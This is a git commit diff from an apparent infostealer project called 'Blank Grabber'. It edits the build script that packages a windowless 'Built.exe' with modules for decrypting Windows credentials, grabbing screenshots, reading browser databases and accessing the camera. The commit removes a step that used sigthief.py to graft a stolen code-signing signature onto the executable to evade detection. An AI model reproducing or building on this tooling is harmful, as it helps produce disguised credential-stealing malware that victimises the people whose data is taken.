c7825e5f214214139677a05b4850878e98939707
Blank <94945186+Blank-c@users.noreply.github.com>
2023-05-03 20:15:48 +0530

    Removed exe signer (bugs)

--- Blank Grabber/Components/run.bat
+++ Blank Grabber/Components/run.bat
@@ -29,12 +29,6 @@ if exist icon.ico (
 )
 pyinstaller --onefile --clean --noconsole --noconfirm stub-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import PIL.Image --hidden-import PIL.ImageGrab --hidden-import PIL.ImageStat --hidden-import pyaes --hidden-import win32crypt --hidden-import json --add-data Camera;. --version-file version.txt %bound%
 if exist dist\Built.exe (
-    if exist cert.exe_sig (
-        python sigthief.py -s cert.exe_sig -t ".\dist\Built.exe" -o ".\dist\Built_signed.exe" > NUL 2>&1
-        if %errorlevel% == 0 (
-            del /F .\dist\Built.exe
-        )
-    )
     explorer.exe dist
     exit
 ) else (
